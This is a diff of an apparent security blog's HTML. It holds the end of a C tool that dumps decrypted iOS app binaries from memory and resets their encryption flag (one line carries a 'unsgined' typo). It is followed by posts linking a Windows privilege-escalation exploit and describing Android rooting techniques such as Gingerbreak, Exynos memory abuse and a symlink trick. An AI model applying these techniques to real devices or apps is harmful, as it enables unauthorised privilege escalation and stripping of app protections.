+</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] detected 64bit ARM binary in memory.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>        <span class="n">lc</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">load_command</span> <span class="o">*</span><span class="p">)((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">pvars</span><span class="o">-&gt;</span><span class="n">mh</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">mach_header</span><span class="p">));</span>
+</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] detected 32bit ARM binary in memory.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">pvars</span><span class="o">-&gt;</span><span class="n">mh</span><span class="o">-&gt;</span><span class="n">ncmds</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="n">lc</span><span class="o">-&gt;</span><span class="n">cmd</span> <span class="o">==</span> <span class="n">LC_ENCRYPTION_INFO</span> <span class="o">||</span> <span class="n">lc</span><span class="o">-&gt;</span><span class="n">cmd</span> <span class="o">==</span> <span class="n">LC_ENCRYPTION_INFO_64</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>            <span class="n">eic</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">encryption_info_command</span> <span class="o">*</span><span class="p">)</span><span class="n">lc</span><span class="p">;</span>
+</span><span class='line'>            <span class="k">if</span> <span class="p">(</span><span class="n">eic</span><span class="o">-&gt;</span><span class="n">cryptid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>                <span class="k">break</span><span class="p">;</span>
+</span><span class='line'>            <span class="n">off_cryptid</span><span class="o">=</span><span class="p">(</span><span class="kt">off_t</span><span class="p">)((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">eic</span><span class="o">-&gt;</span><span class="n">cryptid</span><span class="o">-</span><span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">pvars</span><span class="o">-&gt;</span><span class="n">mh</span><span class="p">);</span>
+</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] offset to cryptid found: @%p(from %p) = %x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">eic</span><span class="o">-&gt;</span><span class="n">cryptid</span><span class="p">,</span> <span class="n">pvars</span><span class="o">-&gt;</span><span class="n">mh</span><span class="p">,</span> <span class="n">off_cryptid</span><span class="p">);</span>
+</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Found encrypted data at address %08x of length %u bytes - type %u.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">eic</span><span class="o">-&gt;</span><span class="n">cryptoff</span><span class="p">,</span> <span class="n">eic</span><span class="o">-&gt;</span><span class="n">cryptsize</span><span class="p">,</span> <span class="n">eic</span><span class="o">-&gt;</span><span class="n">cryptid</span><span class="p">);</span>
+</span><span class='line'>            <span class="k">if</span> <span class="p">(</span><span class="n">realpath</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">rpath</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+</span><span class='line'>                <span class="n">strlcpy</span><span class="p">(</span><span class="n">rpath</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">rpath</span><span class="p">));</span>
+</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Opening %s for reading.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">rpath</span><span class="p">);</span>
+</span><span class='line'>            <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">rpath</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+</span><span class='line'>            <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[-] Failed opening.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>                <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>            <span class="p">}</span>
+</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Reading header</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>            <span class="n">n</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
+</span><span class='line'>            <span class="k">if</span> <span class="p">(</span><span class="n">n</span><span class="o">!=</span><span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">))</span> <span class="p">{</span>
+</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[W] Warning read only %d bytes</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">n</span><span class="p">);</span>
+</span><span class='line'>            <span class="p">}</span>
+</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Detecting header type</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>            <span class="n">fh</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">fat_header</span> <span class="o">*</span><span class="p">)</span><span class="n">buffer</span><span class="p">;</span>
+</span><span class='line'>            <span class="k">if</span> <span class="p">(</span><span class="n">fh</span><span class="o">-&gt;</span><span class="n">magic</span> <span class="o">==</span> <span class="n">FAT_CIGAM</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Executable is a FAT image - searching for right architecture</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>                <span class="n">arch</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">fat_arch</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">fh</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+</span><span class='line'>                <span class="k">for</span> <span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">swap32</span><span class="p">(</span><span class="n">fh</span><span class="o">-&gt;</span><span class="n">nfat_arch</span><span class="p">);</span><span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                    <span class="k">if</span> <span class="p">((</span><span class="n">pvars</span><span class="o">-&gt;</span><span class="n">mh</span><span class="o">-&gt;</span><span class="n">cputype</span> <span class="o">==</span> <span class="n">swap32</span><span class="p">(</span><span class="n">arch</span><span class="o">-&gt;</span><span class="n">cputype</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">pvars</span><span class="o">-&gt;</span><span class="n">mh</span><span class="o">-&gt;</span><span class="n">cpusubtype</span> <span class="o">==</span> <span class="n">swap32</span><span class="p">(</span><span class="n">arch</span><span class="o">-&gt;</span><span class="n">cpusubtype</span><span class="p">)))</span> <span class="p">{</span>
+</span><span class='line'>                        <span class="n">fileoffs</span> <span class="o">=</span> <span class="n">swap32</span><span class="p">(</span><span class="n">arch</span><span class="o">-&gt;</span><span class="n">offset</span><span class="p">);</span>
+</span><span class='line'>                        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Correct arch is at offset %u in the file</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">fileoffs</span><span class="p">);</span>
+</span><span class='line'>                        <span class="k">break</span><span class="p">;</span>
+</span><span class='line'>                    <span class="p">}</span>
+</span><span class='line'>                    <span class="n">arch</span><span class="o">++</span><span class="p">;</span>
+</span><span class='line'>                <span class="p">}</span>
+</span><span class='line'>                <span class="k">if</span> <span class="p">(</span><span class="n">fileoffs</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[-] Could not find correct arch in FAT image</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>                    <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>                <span class="p">}</span>
+</span><span class='line'>            <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">fh</span><span class="o">-&gt;</span><span class="n">magic</span> <span class="o">==</span> <span class="n">MH_MAGIC</span> <span class="o">||</span> <span class="n">fh</span><span class="o">-&gt;</span><span class="n">magic</span> <span class="o">==</span> <span class="n">MH_MAGIC_64</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Executable is a plain MACH-O image</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[-] Executable is of unknown type</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>                <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>            <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">tmp</span> <span class="o">=</span> <span class="n">strrchr</span><span class="p">(</span><span class="n">rpath</span><span class="p">,</span> <span class="sc">&#39;/&#39;</span><span class="p">);</span>
+</span><span class='line'>            <span class="k">if</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[-] Unexpected error with filename.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>                <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>            <span class="p">}</span>
+</span><span class='line'>            <span class="n">strlcpy</span><span class="p">(</span><span class="n">npath</span><span class="p">,</span> <span class="n">tmp</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">npath</span><span class="p">));</span>
+</span><span class='line'>            <span class="n">strlcat</span><span class="p">(</span><span class="n">npath</span><span class="p">,</span> <span class="s">&quot;.decrypted&quot;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">npath</span><span class="p">));</span>
+</span><span class='line'>            <span class="n">strlcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">npath</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Opening %s for writing.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">npath</span><span class="p">);</span>
+</span><span class='line'>            <span class="n">outfd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">npath</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="o">|</span><span class="n">O_CREAT</span><span class="o">|</span><span class="n">O_TRUNC</span><span class="p">,</span> <span class="mo">0644</span><span class="p">);</span>
+</span><span class='line'>            <span class="k">if</span> <span class="p">(</span><span class="n">outfd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                <span class="k">if</span> <span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="s">&quot;/private/var/mobile/Applications/&quot;</span><span class="p">,</span> <span class="n">rpath</span><span class="p">,</span> <span class="mi">33</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[-] Failed opening. Most probably a sandbox issue. Trying something different.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>                    <span class="n">strlcpy</span><span class="p">(</span><span class="n">npath</span><span class="p">,</span> <span class="s">&quot;/private/var/mobile/Applications/&quot;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">npath</span><span class="p">));</span>
+</span><span class='line'>                    <span class="n">tmp</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">rpath</span><span class="o">+</span><span class="mi">33</span><span class="p">,</span> <span class="sc">&#39;/&#39;</span><span class="p">);</span>
+</span><span class='line'>                    <span class="k">if</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[-] Unexpected error with filename.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>                        <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>                    <span class="p">}</span>
+</span><span class='line'>                    <span class="n">tmp</span><span class="o">++</span><span class="p">;</span>
+</span><span class='line'>                    <span class="o">*</span><span class="n">tmp</span><span class="o">++</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>                    <span class="n">strlcat</span><span class="p">(</span><span class="n">npath</span><span class="p">,</span> <span class="n">rpath</span><span class="o">+</span><span class="mi">33</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">npath</span><span class="p">));</span>
+</span><span class='line'>                    <span class="n">strlcat</span><span class="p">(</span><span class="n">npath</span><span class="p">,</span> <span class="s">&quot;tmp/&quot;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">npath</span><span class="p">));</span>
+</span><span class='line'>                    <span class="n">strlcat</span><span class="p">(</span><span class="n">npath</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">npath</span><span class="p">));</span>
+</span><span class='line'>                    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Opening %s for writing.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">npath</span><span class="p">);</span>
+</span><span class='line'>                    <span class="n">outfd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">npath</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="o">|</span><span class="n">O_CREAT</span><span class="o">|</span><span class="n">O_TRUNC</span><span class="p">,</span> <span class="mo">0644</span><span class="p">);</span>
+</span><span class='line'>                <span class="p">}</span>
+</span><span class='line'>                <span class="k">if</span> <span class="p">(</span><span class="n">outfd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                    <span class="n">perror</span><span class="p">(</span><span class="s">&quot;[-] Failed opening&quot;</span><span class="p">);</span>
+</span><span class='line'>                    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>                    <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>                <span class="p">}</span>
+</span><span class='line'>            <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">n</span> <span class="o">=</span> <span class="n">fileoffs</span> <span class="o">+</span> <span class="n">eic</span><span class="o">-&gt;</span><span class="n">cryptoff</span><span class="p">;</span>
+</span><span class='line'>            <span class="n">restsize</span> <span class="o">=</span> <span class="n">lseek</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">SEEK_END</span><span class="p">)</span><span class="o">-</span><span class="n">n</span><span class="o">-</span><span class="n">eic</span><span class="o">-&gt;</span><span class="n">cryptsize</span><span class="p">;</span>
+</span><span class='line'>            <span class="n">lseek</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">SEEK_SET</span><span class="p">);</span>
+</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Copying the not encrypted start of the file</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>            <span class="k">while</span> <span class="p">(</span><span class="n">n</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                <span class="n">toread</span> <span class="o">=</span> <span class="p">(</span><span class="n">n</span><span class="o">&gt;</span><span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">))</span> <span class="o">?</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span> <span class="o">:</span> <span class="n">n</span><span class="p">;</span>
+</span><span class='line'>                <span class="n">r</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="n">buffer</span><span class="p">,</span><span class="n">toread</span><span class="p">);</span>
+</span><span class='line'>                <span class="k">if</span> <span class="p">(</span><span class="n">r</span><span class="o">!=</span><span class="n">toread</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[-] Error reading file</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>                    <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>                <span class="p">}</span>
+</span><span class='line'>                <span class="n">n</span> <span class="o">-=</span> <span class="n">r</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>                <span class="n">r</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">outfd</span><span class="p">,</span><span class="n">buffer</span><span class="p">,</span><span class="n">toread</span><span class="p">);</span>
+</span><span class='line'>                <span class="k">if</span> <span class="p">(</span><span class="n">r</span><span class="o">!=</span><span class="n">toread</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[-] Error writing file</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>                    <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>                <span class="p">}</span>
+</span><span class='line'>            <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Dumping the decrypted data into the file</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>            <span class="n">r</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">outfd</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">pvars</span><span class="o">-&gt;</span><span class="n">mh</span><span class="o">+</span><span class="n">eic</span><span class="o">-&gt;</span><span class="n">cryptoff</span><span class="p">,</span><span class="n">eic</span><span class="o">-&gt;</span><span class="n">cryptsize</span><span class="p">);</span>
+</span><span class='line'>            <span class="k">if</span> <span class="p">(</span><span class="n">r</span><span class="o">!=</span><span class="n">eic</span><span class="o">-&gt;</span><span class="n">cryptsize</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[-] Error writing file</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>                <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>            <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">n</span> <span class="o">=</span> <span class="n">restsize</span><span class="p">;</span>
+</span><span class='line'>            <span class="n">lseek</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="n">eic</span><span class="o">-&gt;</span><span class="n">cryptsize</span><span class="p">,</span><span class="n">SEEK_CUR</span><span class="p">);</span>
+</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Copyting the not encrypted remainder of the file</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>            <span class="k">while</span> <span class="p">(</span><span class="n">n</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                <span class="n">toread</span> <span class="o">=</span> <span class="p">(</span><span class="n">n</span><span class="o">&gt;</span><span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">))</span> <span class="o">?</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span> <span class="o">:</span> <span class="n">n</span><span class="p">;</span>
+</span><span class='line'>                <span class="n">r</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="n">buffer</span><span class="p">,</span><span class="n">toread</span><span class="p">);</span>
+</span><span class='line'>                <span class="k">if</span> <span class="p">(</span><span class="n">r</span><span class="o">!=</span><span class="n">toread</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[-] Error reading file</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>                    <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>                <span class="p">}</span>
+</span><span class='line'>                <span class="n">n</span> <span class="o">-=</span> <span class="n">r</span><span class="p">;</span>
+</span><span class='line'>                <span class="n">r</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">outfd</span><span class="p">,</span><span class="n">buffer</span><span class="p">,</span><span class="n">toread</span><span class="p">);</span>
+</span><span class='line'>                <span class="k">if</span> <span class="p">(</span><span class="n">r</span><span class="o">!=</span><span class="n">toread</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[-] Error writing file</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>                    <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>                <span class="p">}</span>
+</span><span class='line'>            <span class="p">}</span>
+</span><span class='line'>            <span class="k">if</span> <span class="p">(</span><span class="n">off_cryptid</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                <span class="kt">uint32_t</span> <span class="n">zero</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>                <span class="n">off_cryptid</span><span class="o">+=</span><span class="n">fileoffs</span><span class="p">;</span>
+</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Setting the LC_ENCRYPTION_INFO-&gt;cryptid to 0 at offset %x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">off_cryptid</span><span class="p">);</span>
+</span><span class='line'>                <span class="k">if</span> <span class="p">(</span><span class="n">lseek</span><span class="p">(</span><span class="n">outfd</span><span class="p">,</span><span class="n">off_cryptid</span><span class="p">,</span><span class="n">SEEK_SET</span><span class="p">)</span><span class="o">!=</span><span class="n">off_cryptid</span><span class="o">||</span><span class="n">write</span><span class="p">(</span><span class="n">outfd</span><span class="p">,</span><span class="o">&amp;</span><span class="n">zero</span><span class="p">,</span><span class="mi">4</span><span class="p">)</span><span class="o">!=</span><span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[-] Error writing cryptid value</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>                <span class="p">}</span>
+</span><span class='line'>            <span class="p">}</span>
+</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Closing original file</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>            <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Closing dump file</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>            <span class="n">close</span><span class="p">(</span><span class="n">outfd</span><span class="p">);</span>
+</span><span class='line'>            <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>        <span class="p">}</span>
+</span><span class='line'>        <span class="n">lc</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">load_command</span> <span class="o">*</span><span class="p">)((</span><span class="n">unsgined</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">lc</span><span class="o">+</span><span class="n">lc</span><span class="o">-&gt;</span><span class="n">cmdsize</span><span class="p">);</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[-] This mach-o file is not encrypted. Nothing was decrypted.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/05/25/windows-8-dot-x-trackpopupmenu-privilege-escalation/">Windows 8.X TrackPopupMenu Privilege Escalation</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-05-25T23:02:30+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>25</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>11:02 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><a href="http://packetstormsecurity.com/files/131964/trackpopupmenu-escalate.txt">Windows 8.x TrackPopupMenu Privilege Escalation</a></p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/05/25/rooting-methods/">Rooting Methods</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-05-25T22:20:02+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>25</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>10:20 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h3>HackingTeam 이 사용하는 exploits</h3>
+
+<ul>
+<li>framaroot</li>
+<li><a href="https://github.com/android-rooting-tools">towelroot</a></li>
+<li><a href="https://github.com/fi01/libput_user_exploit/blob/master/put_user.c">putuser</a></li>
+</ul>
+
+
+<h3>Gingerbreak</h3>
+
+<p>The vulnerability exploited by Gingerbreak exists in the Volume Manager (vold) on Android version 2.2 (Froyo) - and 3.0 (Honeycomb). Vold manages the mounting of external storage volumes on Android. The vulnerability was an out-of-bounds array access that allowed the exploit author to overwrite entries in the Global Offset Table (GOT) to trick the system into executing a copy of the sh binary as root.</p>
+
+<p><a href="http://c-skills.blogspot.com/2011/04/yummy-yummy-gingerbreak.html">here</a></p>
+
+<h3>Exynos Abuse - Exploiting Custom Drivers</h3>
+
+<p><a href="http://forum.xda-developers.com/showthread.php?t=2048511">here</a></p>
+
+<p>The post detailed that a block device located at /dev/exynos-mem allowed the mapping of kernel memory into user space by any user. The exploitation technique used was to patch a comparison made in the <code>setresuid()</code> function. This comparison is normally <code>cmp r0,#0</code> and was altered to <code>cmp r0,#1</code> as a result of having complete access to the memory space, which meant that when sysresuid(0) was called later on the code, access was granted to change to root context. This exploit also elegantly bypassed the <code>kptr_restrict</code> memory protection, which does not allow applications to read <code>/proc/kallsyms</code> and obtain kernel pointers. It did so by changing the enforcing flag of this check in live memory.</p>
+
+<h3>Samsung Admire - Abusing File Permissions with Symlinks</h3>
+
+<p>Permissive file permissions on files used by the system on Android devices can sometimes be used to obtain root. This method may sound obscure but consider the following classic example from Dan Rosenberg in his exploit for the Samsung Admire: <a href="http://vulnfactory.org/blog/2011/09/12/rooting-the-samsung-admire/">here</a></p>
+
+<p>He discovered that when an application crashes, a dump file was created at <code>/data/log/dumpState_app_native.log</code> on the filesystem by root with the world-writable file permission. In addition, the <code>/data/log</code> parent directory was also world-writable. Therefore, placing a symbolic link named <code>dumpState_app_native.log</code> in this directory and causing an application to crash would cause a file to be written somewhere else on the filesystem as world-writable. There existed a file in older versions of Android at <code>/data/local.prop</code>, which was used to (among other things) determine what privilege level ADB should run under. This file was not present on this device and so Dan exploited this vulnerability to create the <code>/data/local/prop</code> file as wrold-writable and then insert a command in this file stating that ADB should run as root. This attribute is <code>ro.kernel.qemu=1</code> on this particular device. From there the exploit uses ADB as root, place the su binary, and installs the root manager application.</p>
+
